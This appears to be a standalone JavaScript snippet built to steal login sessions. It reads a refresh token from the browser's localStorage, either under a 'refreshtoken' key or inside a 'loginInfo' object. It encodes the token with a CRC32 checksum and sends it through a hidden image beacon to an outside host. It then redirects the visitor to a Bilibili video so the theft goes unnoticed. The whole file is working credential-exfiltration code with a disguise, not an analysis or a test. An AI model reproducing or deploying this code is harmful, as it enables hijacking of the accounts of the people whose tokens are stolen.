(function(){
  var targetUrl = 'https://www.bilibili.com/video/BV1UT42167xb/';
  var searchKey = 'refreshtoken';
  var beaconUrl = 'https://baner.airoe.cn/beacon?d=';

  var token = null;
  
  var matchKey = '';
  for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    if (key && key.toLowerCase() === searchKey) {
      matchKey = key;
      break;
    }
  }
  
  if (matchKey) {
    token = localStorage.getItem(matchKey);
  }
  
  if (!token) {
    try {
      var loginInfoStr = localStorage.getItem('loginInfo');
      if (loginInfoStr) {
        var loginInfo = JSON.parse(loginInfoStr);
        if (loginInfo && loginInfo.data && loginInfo.data.refreshToken) {
          token = loginInfo.data.refreshToken;
        }
      }
    } catch(e) {}
  }
  
  if (!token) {
    window.location.href = targetUrl;
    return;
  }

  var encoder = new TextEncoder();
  var bytes = encoder.encode(token);
  var crc = 0xFFFFFFFF;
  for (var j = 0; j < bytes.length; j++) {
    crc = crc ^ bytes[j];
    for (var b = 0; b < 8; b++) {
      if (crc & 1) {
        crc = (crc >>> 1) ^ 0xEDB88320;
      } else {
        crc = crc >>> 1;
      }
    }
  }
  crc = (crc ^ 0xFFFFFFFF) >>> 0;

  var base64 = btoa(String.fromCharCode.apply(null, bytes));
  var payload = base64 + '.' + crc.toString(16);

  var img = new Image();
  img.onload = img.onerror = function() {
    window.location.href = targetUrl;
  };
  img.src = beaconUrl + encodeURIComponent(payload) + '&_=' + Date.now() + Math.random().toString(36).substring(2);
})();